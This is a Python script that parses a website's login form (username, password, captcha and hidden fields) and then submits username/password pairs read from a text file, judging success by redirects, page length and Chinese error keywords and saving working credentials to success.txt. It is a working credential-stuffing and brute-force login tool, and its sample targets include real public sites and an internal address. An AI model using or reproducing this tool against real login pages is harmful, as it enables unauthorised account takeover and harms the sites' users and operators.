#encoding: utf-8
import logging
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import re
import requests
import json


logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - pid:%(process)d - %(message)s')

class form_url:
    def __init__(self,url):
        self.init_start(url)

    def init_start(self,url):
        self.url = url
        self.headers = self.__get_header(url)
        self.form = self.__get_postform(url)
        self.posturl = self.__get_posturl()
        self.hasCaptcha,self.captcha_url = self.__has_captcha()
        self.maindata = {"username":"","password":"","captcha":""}
        self.extradata = {}
        self.errortextlength = []
        self.errorHeaders = []
        self.successtextlength = 0
        #解析form
        self.__decode_form()

    def __get_header(self,url):
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"}
        headers["Referer"] = url
        format_url = urlparse(url)
        headers["Host"] = format_url.netloc
        headers["Origin"] = format_url.scheme+"//"+format_url.netloc
        return headers

    def __get_postform(self,url):
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"}
        session = requests.session()
        #为请求添加session
        self.session = session
        response = requests.get(url,headers=self.headers,timeout=3,)
        self.statusCode = response.status_code
        str_text = response.text
        soup = BeautifulSoup(str_text,"html.parser")
        forms = soup.find_all("form")
        form = ""
        #找到提交表单的form
        formCount = len(forms)
        #如果只是存在一个form
        if formCount == 1:
            return forms[0]
        else:
            for x in range(formCount):
                form = forms[x]
                try:
                    flag = False
                    action = form["action"]
                    #如果发现的action中不存在"in"则会直接往下面寻找
                    if action!="":
                        action = action.replace("http://","")
                        index = action.find("/")
                        action = action[index:]
                    if action.find("in")!=-1 or action=="":
                        flag = True
                except:
                    continue
                #除去隐藏标签，如果数量小于2，去掉此form
                inputs = form.find_all("input")
                hidden_button_amount = self.__get_hidden_button_amount(form)
                if (len(inputs)-hidden_button_amount)<2:
                    continue
                if flag:
                    break
            return form

    def __get_posturl(self):
        #得到postUrl
        actionUrl = ''
        try:
            action = self.form["action"]
            if action.strip() == '':
                return ''
        except KeyError as e:
            logger.info(e)
            return ''
        #action不是以http开头
        if not action.find("http")==0:
            # #如果action是以"/"开头
            if action.startswith("/"):
                #获得url中的host
                index = self.url.find("//")
                if index != -1:
                    #协议
                    scheme = self.url[:index+2]
                    url = self.url[index+2:]
                    index =  url.find("/")
                    #获得主机
                    if index != -1:
                        url = url[:index]
                        actionUrl = scheme+url+action
                    #如果不存在"/"
                    else:
                        actionUrl = scheme+url+"/"+action
            #如果action不是以"/"开头
            else:
                index = self.url.rfind('/')
                #如果不存在'/'
                if index == -1:
                    actionUrl = self.url+'/'+action
                #如果'/'在最后
                elif index == len(self.url)-1:
                    actionUrl = self.url+action
                else:
                    url = self.url[:index+1]
                    actionUrl = url + action
        #action是以http开头的
        else:
            actionUrl = action
        return actionUrl

    def __has_captcha(self):
        img_tag = self.form.find_all("img")
        has_captcha = True
        captcha_url = ''
        #不存在img标签，则不存在验证码
        if len(img_tag) == 0:
            has_captcha = False
        else:
            first_img_tag = img_tag[0]
            if not first_img_tag.find_previous('input'):
                first_img_tag = img_tag[1]
                print(first_img_tag)
            try:
                img_src_value = first_img_tag['src']
                attributes = first_img_tag.attrs
                if 'src' in attributes:
                    src_value = first_img_tag['src']
                    src_url = urlparse(src_value)
                    if 'alt' in attributes:
                        alt_value = first_img_tag['alt']
                        if alt_value == '验证码' or alt_value == 'captcha':
                            has_captcha = True
                    elif src_url.query:
                        has_captcha = True
                    elif 'onclick' in attributes:
                        has_captcha = True
                    else:
                        has_captcha = False
                if has_captcha:
                    captcha_url = img_src_value
            except:
                has_captcha = False
        if has_captcha:
            urlformat = urlparse(self.url)
            scheme,netloc = urlformat.scheme,urlformat.netloc
            captcha_url = self.__get_captcha_url(captcha_url)
        logger.info(str(has_captcha)+'-----'+captcha_url)
        return has_captcha,captcha_url

    def __get_captcha_url(self,captcha_url):
        #captcha_url不是以http开头
        actionUrl = ''
        if not captcha_url.find("http")==0:
            # #如果action是以"/"开头
            if captcha_url.startswith("/"):
                #获得url中的host
                index = self.url.find("//")
                if index != -1:
                    #协议
                    scheme = self.url[:index+2]
                    url = self.url[index+2:]
                    index =  url.find("/")
                    #获得主机
                    if index != -1:
                        url = url[:index]
                        actionUrl = scheme+url+captcha_url
                    #如果不存在"/"
                    else:
                        actionUrl = scheme+url+"/"+captcha_url
            #如果action不是以"/"开头
            else:
                index = self.url.rfind('/')
                #如果不存在'/'
                if index == -1:
                    actionUrl = self.url+'/'+captcha_url
                #如果'/'在最后
                elif index == len(self.url)-1:
                    actionUrl = self.url+captcha_url
                else:
                    url = self.url[:index+1]
                    actionUrl = url + captcha_url
        #captcha_url是以http开头的
        else:
            actionUrl = captcha_url
        return actionUrl

    def __decode_form(self):
        # print(str(self.form).encode('gbk', 'ignore').decode('gbk'))
        #得到input标签的数量
        tags_input = self.form.find_all("input")
         #去掉submit
        tags_input = self.__remove_submit_button(tags_input)
        #如果存在验证码，同时去掉验证码标签
        if self.hasCaptcha:
            tag_captcha = self.get_captcha_tag(self.form)
            if tag_captcha:
                tags_input.remove(tag_captcha)
        #找到密码标签
        input_password_index = self.get_password_input(tags_input)
        input_password = tags_input[input_password_index]
        self.maindata["password"] = input_password["name"]
        #找到用户名标签
        input_username = tags_input[input_password_index-1]
        self.maindata["username"] = input_username["name"]
        #去掉用户名和密码标签
        tags_input.remove(input_password)
        tags_input.remove(input_username)
        i = 0
        for tag_input in tags_input:
            #默认第一个为用户名，第二个为密码
            try:
                input_name = tag_input["name"]
            except:
                pass
            try:
                input_default_value = tag_input["value"]
                self.extradata[input_name] = input_default_value
            except:
                self.extradata[input_name] = ""


    def __remove_submit_button(self,tags_input):
        inputs = list(tags_input)
        for tag_input in tags_input:
            attributes = tag_input.attrs
            if "type" in attributes:
                typeValue = attributes["type"]
                if typeValue=="submit" or typeValue=='reset':
                    inputs.remove(tag_input)
        return inputs

    def __get_hidden_button_amount(self,form):
        i = 0
        tags_input = form.select("input[type='hidden']")
        i = len(tags_input)
        return i

    def get_captcha_tag(self,form):
        #remove all hidden button
        tempform = BeautifulSoup(str(form), "html.parser")
        hidden_button = tempform.select('input[type="hidden"]')
        for button in hidden_button:
            button.decompose()
        tag_imgs = tempform.find_all("img")
        for tag_img in tag_imgs:
            tag_captcha = tag_img.find_previous("input")
            if not tag_captcha:
                continue
            else :
                attributes = tag_captcha.attrs
                if 'type' in attributes:
                    if attributes['type'] != 'password':
                        input_name = tag_captcha["name"]
                        self.maindata["captcha"] = input_name
                        return tag_captcha
                    elif attributes['type'] == 'password':
                        tag_captcha = tag_img.find_next('input')
                        if tag_captcha:
                            input_name = tag_captcha['name']
                            self.maindata['captcha'] = input_name
                            return tag_captcha
                else:
                    input_name = tag_captcha['name']
                    self.maindata['captcha'] = input_name
    #找到密码标签
    def get_password_input(self,tags_input):
        tags_input = list(tags_input)
        i = 0
        for tags_input in tags_input:
            attributes = tags_input.attrs
            if "type" in attributes:
                typeValue = attributes["type"]
                if typeValue == "password":
                   return i
            i = i+1

    def post_form(self):

        #从txt中读取用户名和密码，进行测试
        #第一次发送错误请求，记录长度
        self.first_form_login()
        print("发送错误请求，得到的长度为:"+str(self.errortextlength[0]))
        f = open("data2.txt","r")
        alllines = f.readlines()
        f.close()
        f_success = open("success.txt","w+")
        f_failed = open("failed.txt","w+")
        for eachline in alllines:
            data = eachline
            #空格分割
            datas = data.split()
            username = datas[0]
            pwd = datas[1]
            #模拟网站登录
            loginresult = self.post_form_login(username,pwd)
            if loginresult:
                f_success.write(eachline)
            else:
                f_failed.write(eachline)
        f_failed.close()
        f_success.close()

    def first_form_login(self):
        postdata = {}
        postdata[self.maindata["username"]] = "wyj"
        postdata[self.maindata["password"]] = "wyj"
        if self.hasCaptcha:
            postdata[self.maindata["captcha"]] = ""
        postdata.update(self.extradata)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"}
        postresponse = requests.post(self.posturl,data=postdata,headers=headers)
        responseHtml = postresponse.text
        responseHeaders = postresponse.headers
        headersKeys = responseHeaders.keys()
        self.errorHeaders = list(headersKeys)
        self.errorHeaders.sort()
        errorpageLength = len(responseHtml)
        self.errortextlength.append(errorpageLength)


    def post_form_login(self,username,pwd):
        postdata = {}
        postdata[self.maindata["username"]] = username
        postdata[self.maindata["password"]] = pwd
        if self.hasCaptcha:
            postdata[self.maindata["captcha"]] = ""
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"}
        #请求网页获得cookie
        session = requests.session()
        contents = session.get(self.url,headers=headers)
        contents_soup = BeautifulSoup(contents.text,"html.parser")
        for key in self.extradata:
            value = contents_soup.find("input",{"name":key})["value"]
            self.extradata[key] = value
        postdata.update(self.extradata)
        postresponse = session.post(self.posturl,data=postdata,headers=self.headers)
        responseHtml = postresponse.text
        responseHeaders_Keys = list(postresponse.headers.keys())
        responseHeaders_Keys.sort()
        loginresult = False
        if not len(postresponse.history)==0:
            history = postresponse.history[0].status_code
            if history==302:
                if len(responseHtml) in self.errortextlength:
                    print("登陆失败，页面没有变化")
                    loginresult = False
                else:
                    if self.error_login_page(responseHtml):
                        print("跳转之后，登录失败",len(responseHtml))
                        self.errortextlength.append(len(responseHtml))
                    else:
                        print("登录成功，页面变化",len(responseHtml))
                        loginresult = True
                        #登录成功记录下登录的页面长度
                        self.successtextlength = len(responseHtml)
        # elif  self.cmp_headers(responseHeaders_Keys):
        #     print("登录失败,header相同")
        else:
            textlength = len(responseHtml)
            if self.error_login_page(responseHtml):
                self.errortextlength.append(textlength)
                print("登录失败,error",textlength)
            elif textlength in self.errortextlength:
                print("登录失败",textlength)
            elif textlength == self.successtextlength:
                print("登录成功",textlength)
            else:
                print(postresponse.status_code)
        return loginresult

    def error_login_page(self,html):
        pattern = "无效|错误|不存在|不正确|正确|输入|填写|验证码|没有|登录"
        re_error_pattern = re.compile(pattern)
        flags = re.findall(re_error_pattern,html)
        if(len(flags)>0):
            #判断是否要求输入验证码的情况
            self.change_form_decode(html)
            return True
        else:
            return False

    def change_form_decode(self,html):
        pattern = "请填写验证码"
        re_error_captcha = re.compile(pattern)
        flags = re.findall(re_error_captcha,html)
        #如果发现要求输入验证码，并且之前不存在验证码
        #则需要重新分析表单
        if(len(flags)>0) and not self.hasCaptcha:
            self.init_start(self.url)
            self.__decode_form()



if __name__ == '__main__':
    #url = 'http://210.42.121.241/'
    #url = 'https://account.tophant.com/login.html?response_type=code&client_id=b611bfe4ef417dbc&state=d77b1f310c982f1de03a8f2df672eb26&redirectURL=http://www.freebuf.com'
    #url = 'https://www.91ri.org/wp-login.php'
    #url = 'https://www.oschina.net/home/login?goto_page=http%3A%2F%2Fwww.oschina.net%2F'
    # url = 'http://accounts.douban.com/login?uid=70730779&alias=wang_monkey1%40163.com&redir=http%3A%2F%2Fwww.douban.com%2F&source=index_nav&error=1013'
    url = 'https://account.tophant.com/login.html?response_type=code&client_id=b611bfe4ef417dbc&state=b5a97a29efa454b865ecb998f3433a26&redirectURL=http://open.freebuf.com'
    url = 'http://www.v2ex.com/signin'
    url = 'http://www.shanbay.com/accounts/login/'
    url = 'http://10.1.17.16:8020/jsp/login.jsp'
    # url = 'http://toutiao.io/ssignin'
    # url = 'http://news.dbanotes.net/x?fnid=FtAVoDBUul'
    form = form_url(url)
    print(form.maindata)
    print(form.extradata)
    print(form.hasCaptcha)
    print(form.posturl)